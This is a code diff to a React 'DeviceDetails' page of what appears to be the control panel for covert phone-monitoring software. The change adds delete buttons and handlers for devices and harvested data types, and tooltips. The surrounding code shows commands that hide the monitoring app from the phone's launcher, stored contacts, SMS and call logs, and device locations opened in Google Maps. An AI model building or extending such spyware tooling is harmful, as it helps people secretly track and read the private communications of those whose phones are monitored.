@@ -217,6 +217,60 @@ export default function DeviceDetails() {
     }
   };
 
+  // Delete entire device
+  const deleteDevice = async () => {
+    if (!confirm("Delete this device and all its data? This cannot be undone."))
+      return;
+    try {
+      const token = localStorage.getItem("token");
+      await axios.delete(`${API}/api/devices/${deviceId}`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      toast.success("Device deleted");
+      navigate("/devices");
+    } catch (err) {
+      toast.error(
+        "Delete failed: " + (err.response?.data?.error || err.message)
+      );
+    }
+  };
+
+  // Delete all data of a type (contacts, sms, callLogs, etc.)
+  const deleteAllDataType = async (dataType, label) => {
+    if (!confirm(`Delete all ${label} data? This cannot be undone.`)) return;
+    try {
+      const token = localStorage.getItem("token");
+      await axios.delete(`${API}/api/devices/${deviceId}/data/${dataType}`, {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      toast.success(`All ${label} deleted`);
+      fetchDevice();
+    } catch (err) {
+      toast.error(
+        "Delete failed: " + (err.response?.data?.error || err.message)
+      );
+    }
+  };
+
+  // Delete single data item by id
+  const deleteDataItem = async (dataType, itemId) => {
+    try {
+      const token = localStorage.getItem("token");
+      await axios.delete(
+        `${API}/api/devices/${deviceId}/data/${dataType}/${itemId}`,
+        {
+          headers: { Authorization: `Bearer ${token}` },
+        }
+      );
+      toast.success("Item deleted");
+      fetchDevice();
+    } catch (err) {
+      toast.error(
+        "Delete failed: " + (err.response?.data?.error || err.message)
+      );
+    }
+  };
+
   const openInGoogleMaps = (lat, lng) => {
     window.open(`https://www.google.com/maps?q=${lat},${lng}`, "_blank");
   };
@@ -279,20 +333,30 @@ export default function DeviceDetails() {
           <button
             onClick={fetchDevice}
             className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
+            title="Refresh"
           >
             <FiRefreshCw className="text-lg" />
           </button>
           <button
             onClick={() => sendCommand("hide_app")}
             className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
+            title="Hide app from launcher"
           >
             <FiEyeOff className="text-lg" />
           </button>
           <button
             onClick={() => sendCommand("unhide_app")}
             className="p-2 rounded-xl hover:bg-dark-700/50 transition-all"
+            title="Unhide app in launcher"
           >
             <FiEye className="text-lg" />
+          </button>
+          <button
+            onClick={deleteDevice}
+            className="p-2 rounded-xl bg-red-500/20 text-red-400 hover:bg-red-500/30 transition-all"
+            title="Delete device and all data"
+          >
+            <FiTrash2 className="text-lg" />
           </button>
         </div>
       </div>
